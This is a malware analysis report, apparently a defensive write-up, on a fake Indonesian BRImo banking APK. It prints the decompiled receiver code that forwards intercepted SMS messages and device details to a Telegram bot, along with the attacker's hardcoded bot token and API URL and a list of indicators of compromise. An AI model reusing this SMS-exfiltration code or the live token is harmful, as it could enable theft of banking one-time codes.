# 🐟 Malware Analysis Report: Fake BRImo.apk

## 🔍 Summary
This analysis covers a fake version of the BRImo.apk, impersonating the legitimate mobile banking app from Bank Rakyat Indonesia (BRI). Unlike the official app, this variant was found outside authorized app stores and exhibits malicious behavior including SMS interception and data exfiltration via Telegram API.

---

## 📦 File Information

- **Filename:** BRImo.apk
- **SHA-256:** `013C8C4518012386F419E4CCA1E78B3F09D3E87B290E87E4093A92BD6ED1175D`
- **Package Name:** `com.smodj.app.smstotelegram`
- **Size:** ~5MB (exact size may vary)
- **Detection:** Manual Detection using Tools.

---

## 📱 Requested Permissions

```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.RECEIVE_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
```
These permissions are red flags, especially for an app claiming to be a banking application, as it allows reading and intercepting user SMS messages.

## 🔐 Hardcoded Secrets (Telegram Bot API)
```xml
private static final String bot_id = "138892312:AAEJMlbP84LiMYcuHCZKz9kCr_LwrCo81A0";
public static final String telegram_url = "https://api.telegram.org/bot138892312:AAEJMlbP84LiMYcuHCZKz9kCr_LwrCo81A0/sendMessage";
```
## 🕵️ Malicious Behavior Overview 
```xml
public void onReceive(Context context, Intent intent) {
    ...
    String telegram_id = read.read(MainConstant.telegram_id_storage_key);
    ...
    String msg = "From: " + senderNum + "\nDevice Info: " + device_name + "\nMessage:\n" + message;
    sendToTelegramAPI(context, telegram_id, msg, MainConstant.telegram_url, stack);
```
- Collects SMS sender and message
- Reads device info (manufacturer + model)
- Sends the data to Telegram using sendMessage API
- Messages are optionally stacked and resent if previous attempts failed

## 🧠 App Settings (Suspicious UI Fragments)
```xml
<PreferenceScreen>
    <EditTextPreference
        android:title="Device Name"
        android:key="DeviceName"
        android:summary="Your current device name."
        android:defaultValue="Default"/>
</PreferenceScreen>
```

## 🛑 Indicators of Compromise (IOCs)

- Package Name : com.smodj.app.smstotelegram
- Bot API URL	: https://api.telegram.org/bot138892312:AAEJMlbP84LiMYcuHCZKz9kCr_LwrCo81A0/sendMessage
- Permissions	: RECEIVE_SMS, READ_SMS, INTERNET
- SHA256 : 013C8C4518012386F419E4CCA1E78B3F09D3E87B290E87E4093A92BD6ED1175D
